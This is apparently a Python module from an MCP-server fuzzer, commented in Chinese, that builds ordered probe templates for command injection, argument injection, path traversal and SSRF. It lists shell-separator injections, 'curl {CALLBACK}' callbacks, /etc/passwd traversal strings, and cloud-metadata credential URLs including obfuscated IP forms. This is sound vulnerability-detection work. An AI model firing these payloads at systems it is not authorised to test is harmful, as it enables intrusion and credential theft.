"""各注入类别的判定套件（battery）：技术原语 × 语境/编码/目标变体 的有序模板。

见 docs/载荷合成模块设计.md 与 docs/漏洞类型与检测手段.md。
- 每条模板 = {value, channel, control, expect, delay_target, technique}；value/expect 里的
  {CALLBACK}/{TOKEN} 占位符由 core 在铸造 oracle 观测物后替换。
- 排序：**不依赖出网、无破坏性的在前**（带内回显/差分/读文件），`sleep`/带外/写文件靠后，
  配合按预算取 top-N，降低请求量与把服务器打慢（DoS）的风险。
- 通道：inband（响应/报错匹配签名）/ timing（时延差）/ oob（带外回连）/
  differential（与基线差分）/ cross_tool（写 canary 再由读工具读回）。程序感知载荷已放弃，全是通用静态模板。
- 载荷选自 PayloadsAllTheThings / SecLists 思路，去 Windows/噪声并改为插桩，通用、不针对任何服务器。
"""
from __future__ import annotations

from mcpfuzz.sink.types import AI, CI, PT, SSRF

# ---------------- 命令注入 ----------------
# shell 语境变体：{c} 为要注入的命令。
_CI_CONTEXTS = ["; {c}", "| {c}", "|| {c}", "& {c}", "&& {c}",
                "$({c})", "`{c}`", "\n{c}\n", "'; {c} #", '"; {c} #']
# 求值型回显：执行后出现 "{TOKEN}1681"（41*41）；若只是把输入原样回显，出现的是
# "{TOKEN}$((41*41))"，不匹配 —— 以此区分"真执行"与"输入回显"，避免误报。
_CI_ECHO = "echo {TOKEN}$((41*41))"
_CI_ECHO_IFS = "echo${IFS}{TOKEN}$((41*41))"   # 空格被过滤时的绕过
_CI_ECHO_EXPECT = ["{TOKEN}1681"]


def _ci_battery() -> list[dict]:
    out = []
    # 1) 带内求值回显（网络无关、无破坏性、最先发）
    for ctx in _CI_CONTEXTS:
        out.append({"value": ctx.format(c=_CI_ECHO), "channel": "inband",
                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
                    "technique": f"ci:echo:{ctx[:4]}"})
    # 1b) 空格绕过变体
    for ctx in ("; {c}", "|{c}"):
        out.append({"value": ctx.format(c=_CI_ECHO_IFS), "channel": "inband",
                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
                    "technique": f"ci:echo-ifs:{ctx[:3]}"})
    # 2) 带外回连
    for ctx in _CI_CONTEXTS:
        out.append({"value": ctx.format(c="curl {CALLBACK}"), "channel": "oob",
                    "expect": None, "control": None, "delay_target": 0.0,
                    "technique": f"ci:curl:{ctx[:4]}"})
    # 3) 时间盲判（会拖慢，靠后）
    for ctx in _CI_CONTEXTS:
        out.append({"value": ctx.format(c="sleep 5"), "channel": "timing",
                    "expect": None, "control": ctx.format(c="sleep 0"), "delay_target": 5.0,
                    "technique": f"ci:sleep:{ctx[:4]}"})
    # 4) cross_tool：写 canary 到 /tmp/{token}，再由读工具读回（内容含 token）
    for ctx in _CI_CONTEXTS[:3]:
        out.append({"value": ctx.format(c="echo {TOKEN}$((41*41)) > /tmp/{TOKEN}"), "channel": "cross_tool",
                    "expect": None, "control": None, "delay_target": 0.0,
                    "technique": f"ci:writecanary:{ctx[:4]}"})
    return out


# ---------------- 参数注入 ----------------
def _ai_battery() -> list[dict]:
    # 未知选项带 token（报错回显该选项即证"被当选项解析"，程序无关、可靠）在前；
    # 再 --version/--help 等良性特征选项差分。写文件型选项程序相关、内容不可控，暂不纳入。
    # reflection_safe=False：token 就在选项名里，被原样回显也会出现 → 命中须有 "unknown option"
    # 类错误指纹佐证（证明被 argv 解析器当选项拒绝）才算确认，否则仅弱证据，避免输入回显误报。
    out = [
        {"value": "--mcpf{TOKEN}", "channel": "inband", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ai:unknown-long", "reflection_safe": False},
        {"value": "--mcpf{TOKEN}=1", "channel": "inband", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ai:unknown-long-eq", "reflection_safe": False},
        {"value": "-mcpf{TOKEN}", "channel": "inband", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ai:unknown-short", "reflection_safe": False},
    ]
    for opt in ("--version", "-V", "--help", "-h", "--usage"):
        out.append({"value": opt, "channel": "differential", "expect": None, "control": None,
                    "delay_target": 0.0, "technique": f"ai:{opt}"})
    return out


# ---------------- 路径穿越 ----------------
_PT_PASSWD_SIGS = ["root:x:0:0:", "root:x:0:0", "daemon:x:"]
_PT_WIN_SIGS = ["[fonts]", "[extensions]", "for 16-bit app support"]
_PT_PASSWD = [
    "../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",                     # URL 编码
    "..%252f..%252f..%252f..%252fetc%252fpasswd",               # 双重编码
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",                       # 反斜杠分隔
    "../../../../../../etc/passwd%00",                           # 空字节截断(历史)
    "../../../../../../etc/passwd\x00.png",
]
_PT_WIN = [
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../windows/win.ini",
    "....\\....\\....\\....\\windows\\win.ini",
]


def _pt_battery() -> list[dict]:
    out = [{"value": v, "channel": "inband", "expect": list(_PT_PASSWD_SIGS), "control": None,
            "delay_target": 0.0, "technique": f"pt:passwd:{v[:16]}"} for v in _PT_PASSWD]
    out += [{"value": v, "channel": "inband", "expect": list(_PT_WIN_SIGS), "control": None,
             "delay_target": 0.0, "technique": f"pt:win:{v[:16]}"} for v in _PT_WIN]
    return out


# ---------------- SSRF ----------------
# 云元数据特征：必须是**只在响应体里出现、且不在我们发的 URL 路径里**的词，否则 URL 被原样
# 回显就会误命中（如 security-credentials/iam/meta-data 都是 URL 路径词，已剔除）。
_SSRF_META_SIGS = ["ami-id", "instance-id", "AccessKeyId", "SecretAccessKey",
                   "InstanceProfile", "owner-account-id", "ssh-rsa"]


def _ssrf_battery() -> list[dict]:
    out = [
        # 带外回连（证明服务端发起了请求；须配边界判别，弱）。{CALLBACK} 已是完整 URL。
        {"value": "{CALLBACK}", "channel": "oob", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ssrf:oob"},
        {"value": "{CALLBACK}/x", "channel": "oob", "expect": None, "control": None,
         "delay_target": 0.0, "technique": "ssrf:oob-path"},
    ]
    # 信任边界：云元数据端点（含 IP 变形绕过）+ 阿里云
    for url in ("http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://2852039166/latest/meta-data/",       # 169.254.169.254 十进制
                "http://0xA9FEA9FE/latest/meta-data/",        # 十六进制
                "http://100.100.100.200/latest/meta-data/"):  # 阿里云
        out.append({"value": url, "channel": "inband", "expect": list(_SSRF_META_SIGS),
                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta:{url[:26]}"})
    # file:// 协议读本地文件（抓取器若支持 file scheme → 返回 /etc/passwd）
    out.append({"value": "file:///etc/passwd", "channel": "inband", "expect": list(_PT_PASSWD_SIGS),
                "control": None, "delay_target": 0.0, "technique": "ssrf:file"})
    return out


_BATTERIES = {CI: _ci_battery, AI: _ai_battery, PT: _pt_battery, SSRF: _ssrf_battery}


def get_battery(vuln_class: str) -> list[dict]:
    """返回某注入类别的有序模板列表；未支持的类别返回空。"""
    fn = _BATTERIES.get(vuln_class)
    return fn() if fn else []
